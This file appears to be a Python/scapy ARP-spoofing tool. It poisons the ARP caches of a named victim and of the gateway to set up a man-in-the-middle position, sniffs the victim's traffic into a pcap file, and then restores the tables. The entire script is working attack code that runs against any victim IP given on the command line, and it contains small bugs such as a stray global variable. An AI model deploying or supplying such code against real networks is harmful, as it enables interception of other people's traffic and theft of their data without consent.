from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
import os 
import sys
import time 



def get_mac(targetIp, targetName):
    print('\n[*] Tracking %s Mac Address .....\n'%(targetName.capitalize()))
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op='who-has', pdst=targetIp)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        print(_[ARP])
        print(r[ARP])
        print("\nCaptured %s Mac address sucessfully!!!\n"%targetName.capitalize())
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface="wlan0"):
        self.victim = victim
        self.gateway = gateway 
        self.gateway_mac = get_mac(gateway, "gateway")
        
        self.victim_mac = get_mac(victim, "victim")
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print("-"*40)
        print(f"Initialized Interface : [{interface}]")
        print(f"Gateway : {gateway} is at {self.gateway_mac}")
        print(f"Victim : {victim} is at {self.victim_mac}")
        print("-"*40)



    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()


        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()
        poison_gateway = ARP()
        poison_victim.op = 2
        print("")
        print("-"*40)
        print("\nInitially Data in Victim\n")
        print(f"Source Ip Address : {poison_victim.psrc}")
        print(f"Source Mac Address  : {poison_victim.hwsrc}")
        print(f"Destination Ip Address : {poison_victim.pdst}")
        print(f"Destination Mac  Address : {poison_victim.hwdst}")
        print("-"*40)
        print("")
        print("-"*40)
        print("\nInitially Data in Gateway\n")
        print(f"Source Ip Address : {poison_gateway.psrc}")
        print(f"Source Mac Address  : {poison_gateway.hwsrc}")
        print(f"Destination Ip Address : {poison_gateway.pdst}")
        print(f"Destination Mac  Address : {poison_gateway.hwdst}")
        print("-"*40)

        poison_victim.psrc = self.gateway
        poison_victim.pdst = self.victim
        poison_victim.hwdst = self.victim_mac

        poison_gateway.psrc = self.victim 
        poison_gateway.pdst = self.gateway 
        poison_gateway.hwdst = self.gateway_mac


    
        print("")
        print("-"*40)
        print("\nFinal Data in Gateway\n")
        print(f"Source Ip Address : {poison_gateway.psrc}")
        print(f"Source Mac Address  : {poison_gateway.hwsrc}")
        print(f"Destination Ip Address : {poison_gateway.pdst}")
        print(f"Destination Mac  Address : {poison_gateway.hwdst}")
        print(poison_gateway.summary())
        print("-"*40)
        print("")
        print("-"*40)
        print("\nFinal Data in Victim\n")
        print(f"Source Ip Address : {poison_victim.psrc}")
        print(f"Source Mac Address  : {poison_victim.hwsrc}")
        print(f"Destination Ip Address : {poison_victim.pdst}")
        print(f"Destination Mac  Address : {poison_victim.hwdst}")
        print(poison_victim.summary())
        print("-"*40)

        while True:
            sys.stdout.write(".")
            sys.stdout.flush()
            try:
                send(poison_gateway)
                send(poison_victim)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    
    def sniff(self, count=200): #this function will captured all the packet since all the packet are comming to the attacker
        time.sleep(2)
        print(f'Sniffing {count} packets')
        print("this is the host : %s " %victim)
        bpf_filter = 'ip host %s' %victim
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        print("These are the packet", packets)
        wrpcap('arper.pcap', packets)
        print("got the packets")
        self.restore()
        self.poison_thread.terminate()
        print("Finished")


    def restore(self):
        print("Restoring ARP tables....")
        send(ARP(
            op =2,
            psrc = self.gateway,
            hwsrc = self.gateway_mac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5,
        ))

        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victim_mac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff',
            count=5
        ))





if __name__ == '__main__':
        if len(sys.argv) != 4:
            print("Usage: python script.py <victim_ip> <gateway_ip> <interface>")
            sys.exit(1)


        victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
        myarp = Arper(victim, gateway, interface)
        myarp.run()
# get_mac('192.168.1.5')